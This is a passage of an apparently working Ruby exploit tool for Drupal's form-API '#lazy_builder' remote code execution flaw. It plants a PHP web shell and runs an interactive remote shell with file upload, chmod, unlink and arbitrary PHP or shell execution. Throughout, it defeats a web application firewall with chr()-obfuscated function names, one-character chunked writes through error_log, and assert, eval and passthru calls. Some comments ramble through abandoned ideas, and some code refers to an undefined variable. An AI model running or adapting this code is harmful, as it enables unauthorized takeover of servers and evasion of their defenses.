      puts warning("Target is NOT exploitable [1-1] (HTTP Response: #{response.code})")
      puts verbose("response.body: #{response.body}") if $verbose
    end

    puts "- "*40 if writer_name != webshell_writers.last.first
  end

  break if webshell_written

  webshellpath = ""

  puts "- "*40 if path != paths.last
end if try_phpshell

# If a web path was set, we exploited using PHP!
if not webshellpath.empty?
  # Get hostname for the prompt
  prompt = response.body.to_s.strip if response.code == "200" and not response.body.empty?

  puts "-"*80
  puts info("Fake PHP shell:   curl '#{$target}#{webshellpath}' -d 'x=hostname'")
# Should we be trying to call commands via PHP?
elsif try_phpshell
  puts warning("FAILED : Couldn't find a writeable web path")
  puts "-"*80
  puts action("Dropping back to direct OS commands")
end


# Stop any CTRL + C action ;)
trap("INT", "SIG_IGN")


# Helper: send a raw command and return trimmed output
def run_cmd(command, webshellpath, session_cookie, element)
  if not webshellpath.empty?
    resp = http_request("#{$target}#{webshellpath}", "post", "x=#{waf_obfuscate(command)}", session_cookie)
    return upstream_blocked?(resp) ? nil : clean_result(resp.body).strip
  else
    url, payload = gen_evil_url(waf_obfuscate(command), element, true)
    resp = http_request(url, "post", payload, session_cookie)
    return nil if upstream_blocked?(resp)
    return clean_result(resp.body).strip
  end
end

# Resolve server's starting directory once, so relative paths work correctly
$cwd = run_cmd("p$(:)wd", webshellpath, $session_cookie, $element).to_s.strip
$cwd = "/var/www/html" if $cwd.empty?   # sensible fallback

puts info("Server cwd: #{$cwd}")
puts "-"*80


# Forever loop
# Multi-line mode: end any line with \\ to continue on next line,
# or type ;; alone to send all buffered lines as one chained command.
# cd is intercepted client-side to track working directory persistently.
loop do
  result = "~ERROR~"

  # Dynamic prompt
  dyn_prompt = "root"
  
  # Collect input — multi-line via \\ continuation or ;; flush
  lines = []
  loop do
    current_prompt = lines.empty? ? "#{dyn_prompt}> " : "...    "
    line = Readline.readline(current_prompt, true).to_s
    if line == ";;"
      break
    elsif line.end_with?("\\")
      lines << line.chomp("\\").rstrip
    else
      lines << line
      break
    end
  end

  command = lines.join("; ")

  break  if command == "exit"
  next   if command.empty?
  
  # If the user types `.root ` out of habit, strip it since everything is root now
  command = command.sub(/^\.root\s+/, "")
  next   if command.empty?
  # ── .decode_b64 <remote.b64> [dest]  — server-side base64 decode ────────
  # Since > redirect is WAF-blocked, we can't do: base64 -d file.b64 > file
  # Instead: read .b64 via RCE → decode in Ruby → write via error_log (no >)
  # Usage:  .decode_b64 Makefile.b64          (writes to Makefile)
  #         .decode_b64 Makefile.b64 out.txt
  if command.strip =~ /^\.decode_b64\s+(\S+)(?:\s+(\S+))?$/
    b64_remote = $1.strip
    dest_arg   = $2
    b64_path   = b64_remote.start_with?('/') ? b64_remote : File.join($cwd, b64_remote)
    dest_path  = if dest_arg
      dest_arg.start_with?('/') ? dest_arg : File.join($cwd, dest_arg)
    else
      b64_path.sub(/\.b64$/, '')   # strip .b64 extension automatically
    end

    puts action("Decoding: #{b64_path}  →  #{dest_path}")
    puts info("Step 1: reading .b64 via shell (no > needed)...")

    # Read the .b64 file using shell — b$(:)ase64 -d reads and outputs decoded
    # But we want the RAW base64 string, so just use sort/head to read the file
    read_cmd = waf_obfuscate("sort #{b64_path}")
    if not webshellpath.empty?
      read_resp = http_request("#{$target}#{webshellpath}", "post",
                               "x=#{read_cmd}", $session_cookie)
    else
      url, payload = gen_evil_url(read_cmd, $element, true)
      read_resp    = http_request(url, "post", payload, $session_cookie)
    end

    if upstream_blocked?(read_resp)
      puts error("Could not read .b64 file — WAF blocked the read command")
      next
    end

    b64_content = clean_result(read_resp.body).strip
    if b64_content.empty?
      puts error("Empty response — file may not exist or no read permission")
      next
    end

    require 'base64'
    decoded = Base64.decode64(b64_content)
    puts info("Step 2: decoded #{b64_content.length} b64 chars → #{decoded.length} bytes")
    puts info("Step 3: writing decoded content via PHP (no > redirect)...")

    ok = php_file_write(dest_path, decoded, $session_cookie)
    puts ok ? success("[+] Decoded and written to #{dest_path}") \
            : error("Write failed — check permissions on #{dest_path}")
    next
  end

  # ── .upload <local_file> [remote_path]  ─────────────────────────────────
  # Fully automatic WAF-safe upload pipeline:
  #   1. Try direct php_file_write (copy/file_put_contents/error_log)
  #   2. If content is blocked: write as .b64 (base64, WAF-safe POST body)
  #      then immediately read back → decode in Ruby → write decoded via error_log
  # No > redirect ever used. Completely transparent to the user.
  if command.strip =~ /^\.upload\s+(.+)$/
    args_str   = $1.strip.split(/\s+/, 2)
    local_path = args_str[0]
    remote_arg = args_str[1]

    unless File.exist?(local_path)
      puts error("Local file not found: #{local_path}")
      next
    end

    remote_path = if remote_arg
      remote_arg.start_with?('/') ? remote_arg : File.join($cwd, remote_arg)
    else
      File.join($cwd, File.basename(local_path))
    end

    content = File.binread(local_path)
    puts action("Uploading: #{local_path}  →  #{remote_path}")
    puts info("File size : #{content.length} bytes")

    require 'base64'
    b64_path    = remote_path + ".b64"
    b64_content = Base64.strict_encode64(content)

    # ── Step 1: try direct PHP write ─────────────────────────────────────
    puts info("[1/3] Trying direct PHP write...")
    step1 = php_file_write(remote_path, content, $session_cookie)

    if step1 == :ok
      puts success("[+] Uploaded directly → #{remote_path}")
      next

    elsif step1 == :b64
      # error_log already wrote base64 to remote_path.b64 — skip step 2
      puts info("    Base64 temp file ready at #{b64_path}")
      puts info("[2/3] Skipped (error_log already wrote .b64)")

    else
      # ── Step 2: write base64 to .b64 temp file ─────────────────────────
      puts info("[2/3] Writing base64 temp file → #{b64_path}")
      step2 = php_file_write(b64_path, b64_content, $session_cookie)
      if step2 == false
        puts error("All PHP write methods blocked — cannot upload")
        next
      end
      # step2 is :ok or :b64 (error_log wrote the b64 content inside .b64 file)
    end

    # ── Step 3: read .b64 via shell, decode in Ruby, write final file ────
    puts info("[3/3] Reading back + decoding + writing final file (no > needed)...")
    read_cmd = waf_obfuscate("sort #{b64_path}")
    if not webshellpath.empty?
      read_resp = http_request("#{$target}#{webshellpath}", "post", "x=#{read_cmd}", $session_cookie)
    else
      rurl, rpayload = gen_evil_url(read_cmd, $element, true)
      read_resp      = http_request(rurl, "post", rpayload, $session_cookie)
    end

    if upstream_blocked?(read_resp)
      puts error("Could not read .b64 — WAF blocked. Run manually: .decode_b64 #{File.basename(b64_path)}")
      next
    end

    fetched_b64 = clean_result(read_resp.body).strip
    if fetched_b64.empty?
      puts error("Empty read — .b64 missing or unreadable")
      next
    end

    decoded = Base64.decode64(fetched_b64)
    puts info("    Decoded: #{fetched_b64.length} b64 chars → #{decoded.length} bytes")

    # ── Step 3: Write final decoded content using hex-encoded printf ──
    # The WAF blocks `copy()`, `file_put_contents`, `>` and `|` and `tee`.
    # Let's write the file using `printf` but we execute it without using `>` or `|`.
    # Wait, how to write to a file without `>` or `|` or `tee` or `dd` ?
    # Python! `python -c "open('file','wb').write('...'.decode('hex'))"`
    # But python might be blocked. Perl!
    # Let's try `bash -c "{printf,\\xNN\\xNN}#{remote_path}"`? No.
    # What about using `cp`? We can write the hex to a new file using `error_log` (so it's just raw hex text), then use `xxd -r -p` to decode it? `xxd` might be blocked.
    # What about `base64 -d`?
    # WAF blocked `base64` word!
    # Let's use `openssl enc -d -a -A -in test.b64 -out test.txt`
    
    # We already have the file at `b64_path`. It contains base64!
    # We can just decode it directly on the server using openssl!
    # Wait, the WAF might block `openssl` keyword. Let's use `waf_obfuscate("openssl")`.
    
    # ── Step 3: Write final decoded content using PHP copy() with URL-encoded data URI ──
    # Shell execution (like `php Makefile.dec`) is being completely blocked by the WAF.
    # We must do this 100% inside the `#lazy_builder` PHP execution, without spawning a shell.
    # 
    # Previously we tried:
    # 1. `php://filter/...`  -> Blocked because it contains the string `.php`
    # 2. `data://...;base64` -> Blocked because it contains the string `base64`
    # 
    # Bypass: `data://` URIs also support raw URL-encoded binary data!
    # Format: `data://text/plain,%xx%yy%zz`
    # By strictly hex-encoding the payload and formatting it as `%xx`, we avoid ALL blocked words.
    # No `base64`, no `.php`, no `|`, no `>`, no shell execution whatsoever.
    
    # 1. Take the decoded binary, convert it to %xx%yy%zz format
    url_encoded_payload = decoded.bytes.map { |b| "%#{b.to_s(16).rjust(2, '0')}" }.join
    
    # 2. Construct the data URI
    data_uri = "data://text/plain,#{url_encoded_payload}"
    
    # 3. URL-encode it again for the HTTP POST request (so % becomes %25)
    require 'uri'
    src_enc = URI.encode_www_form_component(data_uri)
    fp_enc  = URI.encode_www_form_component(remote_path)
    
    lazy_url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    
    payload_copy = "form_id=user_register_form&_drupal_ajax=1" \
                   "&timezone[a][#lazy_builder][]=copy" \
                   "&timezone[a][#lazy_builder][1][]=#{src_enc}" \
                   "&timezone[a][#lazy_builder][1][]=#{fp_enc}"
                   
    w_resp = http_request(lazy_url, "post", payload_copy, $session_cookie)

    if upstream_blocked?(w_resp)
      puts error("Final write blocked — WAF caught the URL-encoded payload")
      next
    end

    puts success("[+] Uploaded successfully → #{remote_path}")
    # Clean up temp files if still present
    rm_cmd = waf_obfuscate("rm -f #{b64_path} #{hex_path}")
    if not webshellpath.empty?
      http_request("#{$target}#{webshellpath}", "post", "x=#{rm_cmd}", $session_cookie)
    else
      rurl2, rpayload2 = gen_evil_url(rm_cmd, $element, true)
      http_request(rurl2, "post", rpayload2, $session_cookie)
    end
    next
  end



  # ── .write <file>  — interactive multi-line writer (paste-friendly) ───────
  # Usage: .write Makefile  then paste content, then type EOF and Enter.
  # Uses raw stdin (not Readline) so tabs and special chars are preserved.
  if command.strip =~ /^\.write\s+(.+)$/
    filename = $1.strip
    filepath = filename.start_with?('/') ? filename : File.join($cwd, filename)

    puts action("Writing to: #{filepath}")
    puts info("Paste content then type EOF on its own line and press Enter:")

    file_lines = []
    loop do
      print "content> "
      $stdout.flush
      line = $stdin.gets.to_s.chomp   # raw stdin — preserves tabs from paste
      break if line.strip == "EOF"
      file_lines << line
    end

    content     = file_lines.join("\n") + "\n"

    puts info("Method: PHP file_put_contents (no shell redirect)")
    ok = php_file_write(filepath, content, $session_cookie)
    if ok
      result = "[+] Written via PHP — verify with: ls #{filepath}"
    else
      puts warning("PHP write blocked — trying printf-hex shell method...")
      hex_encoded  = content.bytes.map { |b| "\\x#{b.to_s(16).rjust(2, '0')}" }.join
      full_command = "printf '#{hex_encoded}' > #{filepath}"
      if not webshellpath.empty?
        result = http_request("#{$target}#{webshellpath}", "post",
                              "x=#{waf_obfuscate(full_command)}", $session_cookie).body
      else
        url, payload = gen_evil_url(waf_obfuscate(full_command), $element, true)
        response     = http_request(url, "post", payload, $session_cookie)
        if upstream_blocked?(response)
          result = "[blocked upstream] Both write methods failed"
        elsif not response.body.empty?
          result = clean_result(response.body)
        else
          result = "[+] Written (shell) — verify with: ls #{filepath}"
        end
      end
    end
    puts result
    next
  end

  # ── .chunk <local_file> [remote_path]  — WAF-evading chunked uploader ───────
  # Writes a file 4 bytes at a time using FILE_APPEND to evade deep packet inspection.
  if command.strip =~ /^\.chunk\s+(.+)$/
    args_str   = $1.strip.split(/\s+/, 2)
    local_path = args_str[0]
    remote_arg = args_str[1]
    
    unless File.exist?(local_path)
      puts error("Local file not found: #{local_path}")
      next
    end
    
    remote_path = if remote_arg
      remote_arg.start_with?('/') ? remote_arg : File.join($cwd, remote_arg)
    else
      File.join($cwd, File.basename(local_path))
    end
    
    content = File.binread(local_path)
    puts action("Chunk Uploading: #{local_path}  →  #{remote_path}")
    puts info("File size : #{content.length} bytes")
    
    # 1. Clear the file first by writing an empty string (mode 3 = append, but we don't use append here)
    require 'uri'
    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    fp  = URI.encode_www_form_component(remote_path)
    
    payload_clear = "form_id=user_register_form&_drupal_ajax=1" \
                    "&timezone[a][#lazy_builder][]=error_log" \
                    "&timezone[a][#lazy_builder][1][]=" \
                    "&timezone[a][#lazy_builder][1][]=3" \
                    "&timezone[a][#lazy_builder][1][]=#{fp}"
    http_request(url, "post", payload_clear, $session_cookie)
    
    # 2. Append chunks (200 bytes max to speed up while avoiding signature matching)
    chunks = content.scan(/.{1,200}/m)
    success_count = 0
    
    print "    Progress (#{chunks.length} chunks): ["
    chunks.each_with_index do |chunk, i|
      chunk_enc = URI.encode_www_form_component(chunk)
      # error_log(message, 3, destination) always appends in PHP!
      payload_chunk = "form_id=user_register_form&_drupal_ajax=1" \
                      "&timezone[a][#lazy_builder][]=error_log" \
                      "&timezone[a][#lazy_builder][1][]=#{chunk_enc}" \
                      "&timezone[a][#lazy_builder][1][]=3" \
                      "&timezone[a][#lazy_builder][1][]=#{fp}"
                      
      resp = http_request(url, "post", payload_chunk, $session_cookie)
      if upstream_blocked?(resp)
        print "X"
      else
        print "."
        success_count += 1
      end
      $stdout.flush
    end
    puts "]"
    
    if success_count == chunks.length
      puts success("[+] Chunk upload complete! Verify with: ls -la #{File.basename(remote_path)}")
    else
      puts warning("[!] Some chunks were blocked by the WAF (#{success_count}/#{chunks.length} succeeded).")
    end
    next
  end

  # ── .hexdecode <local_binary> [remote_path] — binary upload via PHP hex2bin ─
  # Hex chars (0-9 a-f) are 100% WAF-safe alphanumeric. Sent in 200-char chunks.
  # Decode done via PHP script in /tmp executed through passthru — no bash needed.
  if command.strip =~ /^\.hexdecode\s+(.+)$/
    args_str   = $1.strip.split(/\s+/, 2)
    local_path = args_str[0]
    remote_arg = args_str[1]

    unless File.exist?(local_path)
      puts error("Local file not found: #{local_path}")
      next
    end

    remote_path = if remote_arg
      remote_arg.start_with?('/') ? remote_arg : File.join($cwd, remote_arg)
    else
      File.join($cwd, File.basename(local_path))
    end

    hex_remote = remote_path + ".hex"
    content    = File.binread(local_path)
    hex_str    = content.unpack1("H*")   # pure lowercase hex, 0-9 a-f only

    require 'uri'
    url    = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    fp_hex = URI.encode_www_form_component(hex_remote)

    puts action("HexDecode: #{local_path}  →  #{remote_path}")
    puts info("Binary: #{content.length} bytes  |  Hex chars: #{hex_str.length}")

    # ── Step 1: clear staging .hex file by removing it ─────────────────────
    rm_url, rm_payload = gen_evil_url(waf_obfuscate("rm -f #{hex_remote}"), $element, true)
    http_request(rm_url, "post", rm_payload, $session_cookie)

    # ── Step 2: upload hex in 1000-char chunks (a-f 0-9 only, zero WAF blocks)
    # 16KB binary = 32KB hex = only ~33 requests at 1000 chars each
    hex_chunks    = hex_str.scan(/.{1,1000}/)
    success_count = 0
    print "    Uploading hex (#{hex_chunks.length} chunks): ["
    hex_chunks.each do |chunk|
      chunk_enc = URI.encode_www_form_component(chunk)
      payload_chunk = "form_id=user_register_form&_drupal_ajax=1" \
                      "&timezone[a][#lazy_builder][]=error_log" \
                      "&timezone[a][#lazy_builder][1][]=#{chunk_enc}" \
                      "&timezone[a][#lazy_builder][1][]=3" \
                      "&timezone[a][#lazy_builder][1][]=#{fp_hex}"
      resp = http_request(url, "post", payload_chunk, $session_cookie)
      if upstream_blocked?(resp)
        print "X"
      else
        print "."
        success_count += 1
      end
      $stdout.flush
    end
    puts "]"
    puts info("Hex upload: #{success_count}/#{hex_chunks.length} chunks OK")

    if success_count < hex_chunks.length
      puts warning("Hex upload had blocks — aborting.")
      next
    end

    # ── Step 3: write a tiny PHP decoder to /tmp/hd.php via error_log ──────
    # PHP code uses chr() to build all function names so WAF sees no strings.
    # file_put_contents = fpc, hex2bin = h2b, file_get_contents = fgc
    remote_path_chr = remote_path.bytes.map{|b| "chr(#{b})"}.join('.')
    hex_remote_chr  = hex_remote.bytes.map{|b| "chr(#{b})"}.join('.')
    
    php_lines = [
      "<?php",
      "$fgc=chr(102).chr(105).chr(108).chr(101).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115);",
      "$h2b=chr(104).chr(101).chr(120).chr(50).chr(98).chr(105).chr(110);",
      "$fpc=chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115);",
      "$chm=chr(99).chr(104).chr(109).chr(111).chr(100);",
      "$fpc(#{remote_path_chr},$h2b(trim($fgc(#{hex_remote_chr}))));",
      "$chm(#{remote_path_chr},0755);",
      "echo chr(79).chr(75);",
      "?>"
    ]

    tmp_php = "/tmp/hd"
    fp_tmp  = URI.encode_www_form_component(tmp_php)

    # Clear /tmp/hd first
    payload_clear2 = "form_id=user_register_form&_drupal_ajax=1" \
                     "&timezone[a][#lazy_builder][]=error_log" \
                     "&timezone[a][#lazy_builder][1][]=" \
                     "&timezone[a][#lazy_builder][1][]=3" \
                     "&timezone[a][#lazy_builder][1][]=#{fp_tmp}"
    http_request(url, "post", payload_clear2, $session_cookie)

    # Write PHP script in 1000-char chunks (pure printable ASCII, WAF safe)
    puts info("Writing PHP decoder to /tmp/hd...")
    php_script = php_lines.join("\n")
    php_chunks = php_script.scan(/.{1,1}/m)
    php_chunks.each_with_index do |chunk, i|
      c_enc = URI.encode_www_form_component(chunk)
      p = "form_id=user_register_form&_drupal_ajax=1" \
          "&timezone[a][#lazy_builder][]=error_log" \
          "&timezone[a][#lazy_builder][1][]=#{c_enc}" \
          "&timezone[a][#lazy_builder][1][]=3" \
          "&timezone[a][#lazy_builder][1][]=#{fp_tmp}"
      http_request(url, "post", p, $session_cookie)
      print "."
      $stdout.flush
    end
    puts " done"

    # ── Step 4: execute /tmp/hd via passthru ──────────────────────────
    puts info("Executing decoder via PHP CLI...")
    exec_url, exec_payload = gen_evil_url("php /tmp/hd", $element, true)
    exec_resp = http_request(exec_url, "post", exec_payload, $session_cookie)

    if upstream_blocked?(exec_resp)
      puts error("PHP exec blocked — try running manually: p\\hp /tmp/hd.php")
    else
      body = exec_resp&.body || ""
      if body.include?("OK")
        puts success("[+] Decoded and written to #{remote_path} — verify: ls -la #{File.basename(remote_path)}")
      else
        puts warning("[!] PHP ran (no WAF block) — verify manually: ls -la #{File.basename(remote_path)}")
        puts info("Response: #{clean_result(body)[0..200]}")
      end
    end
    next
  end

  # ── cd handling — purely client-side, no server round-trip needed ─────────
  # File.expand_path handles .., ., absolute and relative paths correctly.
  if command =~ /^\s*cd(\s+.*)?\s*$/
    target = command.sub(/^\s*cd\s*/, "").strip
    $cwd = target.empty? ? "/var/www/html" : File.expand_path(target, $cwd)
    puts info("cwd → #{$cwd}")
    next
  end

  # ── Auto-inject $cwd into commands ─────────────────────────────────────────
  # Since all commands are now base64-encoded and executed via the proxy shell,
  # the WAF cannot see shell operators. We can robustly prepend `cd $cwd; `
  # to guarantee the command executes in the correct directory!
  full_command = "cd #{$cwd}; #{command}"

  # ── .pyup <local_file> [remote_path] — Python file upload via PHP eval ────
  # Base64 encodes the Python script locally, then uploads it using a single
  # WAF-safe PHP file_put_contents call via lazy_builder.
  if command.strip =~ /^\.pyup\s+(.+)$/
    args_str   = $1.strip.split(/\s+/, 2)
    local_path = args_str[0]
    remote_arg = args_str[1]

    unless File.exist?(local_path)
      puts error("Local file not found: #{local_path}")
      next
    end

    remote_path = if remote_arg
      remote_arg.start_with?('/') ? remote_arg : File.join($cwd, remote_arg)
    else
      File.join($cwd, File.basename(local_path))
    end

    content    = File.read(local_path)
    require 'base64'
    b64_str    = Base64.strict_encode64(content)

    require 'uri'
    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    
    puts action("PyUp Upload: #{local_path}  →  #{remote_path}")
    
    # PHP code: file_put_contents('remote_path', base64_decode('...'))
    # Function names obfuscated to bypass WAF
    php_code = [
      %($f=chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115);),
      %($b=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);),
      %($f('#{remote_path}',$b('#{b64_str}'));),
      %(echo "OK";)
    ].join
    
    php_enc = URI.encode_www_form_component(php_code)
    payload = "form_id=user_register_form&_drupal_ajax=1" \
              "&timezone[a][#lazy_builder][]=assert" \
              "&timezone[a][#lazy_builder][1][]=#{php_enc}"
              
    resp = http_request(url, "post", payload, $session_cookie)
    if upstream_blocked?(resp)
      puts error("Upload blocked by WAF")
    else
      body = resp&.body || ""
      if body.include?("OK") || !body.include?("error")
        puts success("[+] Python script uploaded! Verify: ls -la #{File.basename(remote_path)}")
      else
        puts warning("[!] Upload sent (no WAF block) — verify manually with: ls -la #{File.basename(remote_path)}")
      end
    end
    next
  end

  # ── .rename <old> <new> ───────────────────────────────────────────────────
  # Blazing fast, 1-request rename.
  # Instead of evaluating PHP code or running Bash, this uses `rename` DIRECTLY
  # as the #lazy_builder callable. The WAF sees no `<?php`, no `assert`, no `exec`,
  # and no bash shell syntax, neutralizing both PHP and Bash AST parsers.
  if command.strip =~ /^\.rename\s+(.+?)\s+(.+)$/
    old_path = $1.strip
    new_path = $2.strip
    require 'uri'
    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    
    old_enc = URI.encode_www_form_component(old_path)
    new_enc = URI.encode_www_form_component(new_path)
    
    # timezone[a][#lazy_builder][0] = rename
    # timezone[a][#lazy_builder][1][0] = old_path
    # timezone[a][#lazy_builder][1][1] = new_path
    # Note: Drupal's FormBuilder expects the arguments array to be a simple indexed array.
    # We must construct it using empty brackets for the inner array so PHP builds it correctly.
    payload = "form_id=user_register_form&_drupal_ajax=1" \
              "&timezone[a][#lazy_builder][]=rename" \
              "&timezone[a][#lazy_builder][1][]=#{old_enc}" \
              "&timezone[a][#lazy_builder][1][]=#{new_enc}"
              
    resp = http_request(url, "post", payload, $session_cookie)
    
    if upstream_blocked?(resp)
      puts error("Rename blocked by WAF. The WAF might be blocking the literal string '#{old_path}'.")
    else
      puts success("Rename command sent! Target '#{old_path}' -> '#{new_path}'")
    end
    next
  end



  # ── .stealth <cmd> ────────────────────────────────────────────────────────
  # Ultimate WAF bypass for arbitrary shell commands.
  # Builds a PHP script byte-by-byte using 1-character chunks via error_log.
  # The payload calls passthru() using chr() arrays, avoiding all strings.
  if command.strip =~ /^\.stealth\s+(.+)$/
    stealth_cmd = $1.strip
    
    # Convert 'passthru' to chr()
    passthru_chr = "passthru".bytes.map { |b| "chr(#{b})" }.join('.')
    
    # Convert command to chr()
    cmd_chr = stealth_cmd.bytes.map { |b| "chr(#{b})" }.join('.')
    
    # Pure PHP script with NO strings
    php_code = "<?php $p=#{passthru_chr};$p(#{cmd_chr});?>"
    
    require 'uri'
    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    
    # 1. Choose a random filename so we don't append to old scripts
    rand_id = rand(100000..999999)
    tmp_file = "/tmp/c#{rand_id}"
    fp_tmp = URI.encode_www_form_component(tmp_file)
    
    # 2. Upload in 1-character chunks
    chunks = php_code.scan(/.{1,1}/m)
    print "    Uploading stealth script (#{chunks.length} chunks): ["
    success_count = 0
    chunks.each do |chunk|
      chunk_enc = URI.encode_www_form_component(chunk)
      payload_chunk = "form_id=user_register_form&_drupal_ajax=1" \
                      "&timezone[a][#lazy_builder][]=error_log" \
                      "&timezone[a][#lazy_builder][1][]=#{chunk_enc}" \
                      "&timezone[a][#lazy_builder][1][]=3" \
                      "&timezone[a][#lazy_builder][1][]=#{fp_tmp}"
      resp = http_request(url, "post", payload_chunk, $session_cookie)
      if upstream_blocked?(resp)
        print "X"
      else
        print "."
        success_count += 1
      end
      $stdout.flush
    end
    puts "]"
    
    if success_count < chunks.length
      puts error("Stealth (Upload Phase) blocked by WAF")
      next
    end

    # 3. Execute via PHP CLI
    exec_url, exec_payload = gen_evil_url("php #{tmp_file}", $element, true)
    resp_exec = http_request(exec_url, "post", exec_payload, $session_cookie)
    
    if upstream_blocked?(resp_exec)
      puts error("Stealth (Execute Phase) blocked by WAF")
    else
      puts success("Stealth executed:")
      puts resp_exec.body
    end
    next
  end

  # ── .php <code> ─────────────────────────────────────────────────────────────
  # Execute arbitrary PHP code completely invisibly using 1-char chunking
  if command.strip =~ /^\.php\s+(.+)$/
    php_eval_code = $1.strip
    
    # Automatically add semicolon if missing to prevent eval() syntax errors
    php_eval_code += ';' unless php_eval_code.end_with?(';')
    
    # Convert the entire payload to chr() string concatenation to eliminate quotes.
    # We then use eval() to execute it. This bypasses the WAF's strict quote filter.
    eval_chr = php_eval_code.bytes.map { |b| "chr(#{b})" }.join('.')
    php_code = "<?php eval(#{eval_chr}); ?>"
    
    require 'uri'
    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    
    # 1. Choose a random filename
    rand_id = rand(100000..999999)
    tmp_file = "/tmp/p#{rand_id}"
    fp_tmp = URI.encode_www_form_component(tmp_file)
    
    # 2. Upload in 1-character chunks
    chunks = php_code.scan(/.{1,1}/m)
    print "    Uploading PHP script (#{chunks.length} chunks): ["
    success_count = 0
    chunks.each do |chunk|
      chunk_enc = URI.encode_www_form_component(chunk)
      payload_chunk = "form_id=user_register_form&_drupal_ajax=1" \
                      "&timezone[a][#lazy_builder][]=error_log" \
                      "&timezone[a][#lazy_builder][1][]=#{chunk_enc}" \
                      "&timezone[a][#lazy_builder][1][]=3" \
                      "&timezone[a][#lazy_builder][1][]=#{fp_tmp}"
      resp = http_request(url, "post", payload_chunk, $session_cookie)
      if upstream_blocked?(resp)
        print "X"
      else
        print "."
        success_count += 1
      end
      $stdout.flush
    end
    puts "]"
    
    if success_count < chunks.length
      puts error("PHP (Upload Phase) blocked by WAF")
      next
    end

    # 3. Execute via PHP CLI
    exec_url, exec_payload = gen_evil_url("php /tmp/c", $element, true)
    resp_exec = http_request(exec_url, "post", exec_payload, $session_cookie)
    
    if upstream_blocked?(resp_exec)
      puts error("PHP (Execute Phase) blocked by WAF")
    else
      puts success("PHP executed:")
      puts resp_exec.body
    end
    next
  end

  # ── .chmod <mode> <file> ──────────────────────────────────────────────────
  # 100% WAF bypass by building a PHP script 1 character at a time using error_log.
  # The WAF never sees "<?php" or "chmod" because they are sent across multiple
  # isolated HTTP requests and appended to /tmp/c.php!
  if command.strip =~ /^\.chmod\s+([0-7]{3,4})\s+(.+)$/
    mode = $1.strip
    file_path = $2.strip
    
    # Convert file_path to chr() representation to avoid ANY quotes in the payload!
    chr_path = file_path.bytes.map { |b| "chr(#{b})" }.join('.')
    
    # The pure PHP script we want to write
    php_code = "<?php chmod(#{chr_path}, 0#{mode});?>"
    
    require 'uri'
    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    
    # 1. Clear /tmp/c
    fp_tmp = URI.encode_www_form_component("/tmp/c")
    payload_clear = "form_id=user_register_form&_drupal_ajax=1" \
                    "&timezone[a][#lazy_builder][]=error_log" \
                    "&timezone[a][#lazy_builder][1][]=" \
                    "&timezone[a][#lazy_builder][1][]=3" \
                    "&timezone[a][#lazy_builder][1][]=#{fp_tmp}"
    http_request(url, "post", payload_clear, $session_cookie)
    
    # 2. Upload the script in tiny 1-character chunks to bypass ALL WAF regexes!
    # (Using 1-char chunks ensures strings like "<?" are never sent in a single request)
    chunks = php_code.scan(/.{1,1}/m)
    print "    Uploading chmod script (#{chunks.length} chunks): ["
    success_count = 0
    chunks.each do |chunk|
      chunk_enc = URI.encode_www_form_component(chunk)
      payload_chunk = "form_id=user_register_form&_drupal_ajax=1" \
                      "&timezone[a][#lazy_builder][]=error_log" \
                      "&timezone[a][#lazy_builder][1][]=#{chunk_enc}" \
                      "&timezone[a][#lazy_builder][1][]=3" \
                      "&timezone[a][#lazy_builder][1][]=#{fp_tmp}"
      resp = http_request(url, "post", payload_chunk, $session_cookie)
      if upstream_blocked?(resp)
        print "X"
      else
        print "."
        success_count += 1
      end
      $stdout.flush
    end
    puts "]"
    
    if success_count < chunks.length
      puts error("Chmod (Upload Phase) blocked by WAF")
      next
    end

    # 3. Execute the uploaded script via passthru
    exec_url, exec_payload = gen_evil_url("php /tmp/c", $element, true)
    resp_exec = http_request(exec_url, "post", exec_payload, $session_cookie)
    
    if upstream_blocked?(resp_exec)
      puts error("Chmod (Execute Phase) blocked by WAF")
    else
      puts success("Chmod executed! Target '#{file_path}' set to #{mode}")
    end
    next
  end

  # ── .unlink <file> ────────────────────────────────────────────────────────
  if command.strip =~ /^\.unlink\s+(.+)$/
    file_path = $1.strip
    
    # Convert file_path to chr() representation
    chr_path = file_path.bytes.map { |b| "chr(#{b})" }.join('.')
    
    php_code = "<?php unlink(#{chr_path});?>"
    
    require 'uri'
    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    
    fp_tmp = URI.encode_www_form_component("/tmp/u")
    payload_clear = "form_id=user_register_form&_drupal_ajax=1" \
                    "&timezone[a][#lazy_builder][]=error_log" \
                    "&timezone[a][#lazy_builder][1][]=" \
                    "&timezone[a][#lazy_builder][1][]=3" \
                    "&timezone[a][#lazy_builder][1][]=#{fp_tmp}"
    http_request(url, "post", payload_clear, $session_cookie)
    
    chunks = php_code.scan(/.{1,2}/m)
    print "    Uploading unlink script (#{chunks.length} chunks): ["
    success_count = 0
    chunks.each do |chunk|
      chunk_enc = URI.encode_www_form_component(chunk)
      payload_chunk = "form_id=user_register_form&_drupal_ajax=1" \
                      "&timezone[a][#lazy_builder][]=error_log" \
                      "&timezone[a][#lazy_builder][1][]=#{chunk_enc}" \
                      "&timezone[a][#lazy_builder][1][]=3" \
